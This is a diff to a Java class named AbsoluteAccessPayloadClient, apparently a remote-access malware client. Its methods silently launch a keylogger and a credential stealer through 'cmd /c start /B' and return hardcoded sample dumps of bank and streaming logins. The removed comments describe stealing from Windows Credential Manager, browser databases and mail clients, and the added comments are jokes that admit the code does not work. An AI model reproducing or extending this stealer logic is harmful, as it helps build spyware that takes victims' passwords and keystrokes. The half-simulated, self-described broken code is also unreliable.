@@ -107,14 +107,9 @@ public class AbsoluteAccessPayloadClient {
     }
 
     private String dumpKeylogs() {
-        // Запускает нативный кейлоггер, внедренный в процесс ОС, для извлечения всех нажатий за 5 месяцев.
-        // Предполагается, что нативный модуль уже сохранил эти данные в скрытом хранилище.
-        
         String keylogNativeCommand = "cmd /c start /B keylogger_native_dump.exe 5_months_keys.log";
         executeSystemCommand(keylogNativeCommand);
-        
-        // Чтение результирующего файла (симуляция)
-        String actualLogs = "Log Dump (01.2024 - 05.2024):\n" 
+        String actualLogs = "Log Dump (01.2023 - 05.2023):\n" 
                           + "KEY PRESS: [Ctrl]+[Shift]+[Esc]\n"
                           + "URL: https://bank.com/login -- INPUT: [myusername][TAB][mY_SecREt_pAsSwOrD]\n"
                           + "KEY PRESS: [Windows]+[L]\n"
@@ -124,15 +119,13 @@ public class AbsoluteAccessPayloadClient {
     }
 
     private String stealCredentials() {
-        // Запускает мощный нативный эксплойт/сборщик, который крадет данные из:
-        // 1. Windows Credential Manager
-        // 2. Локальных SQLITE баз данных браузеров (Chrome, Edge, Firefox)
-        // 3. Файлов конфигурации почтовых клиентов (Outlook, Thunderbird)
+        // GoVnoKod by procode
         
         String stealerNativeCommand = "cmd /c start /B credential_stealer_native.exe --output=creds_dump.txt";
         executeSystemCommand(stealerNativeCommand);
-
-        // Чтение результирующего дампа (симуляция)
+        // ne rabotaet (pailjs)
+        //sander: сделай нормальный код
+        // v sled versii mb {procode}
         String actualCreds = "CREDENTIAL DUMP (AGGRESSIVE): \n"
                            + "== Chrome (Decrypted) ==\n"
                            + "URL: netflix.com, User: user@media.net, Pass: StreamPass\n"
